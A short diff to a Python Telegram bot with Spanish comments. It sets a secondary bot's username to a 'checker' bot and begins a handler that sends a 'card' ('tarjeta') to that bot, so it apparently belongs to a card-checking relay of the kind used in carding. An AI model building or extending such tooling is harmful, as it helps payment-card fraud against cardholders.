@@ -4,7 +4,7 @@ from telegram.ext import ContextTypes
 from funcionamiento.automation import enviar_a_bot_secundario, iniciar_automation
 
 # ⚠️ REEMPLAZA con el username REAL del bot secundario
-BOT_SECUNDARIO = "@NombreDelBotSecundarioBot"  # Ejemplo: "@MyCheckerBot"
+BOT_SECUNDARIO = "@Alphachekerbot"  # Ejemplo: "@MyCheckerBot"
 
 async def bn(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Envía tarjeta a bot secundario"""
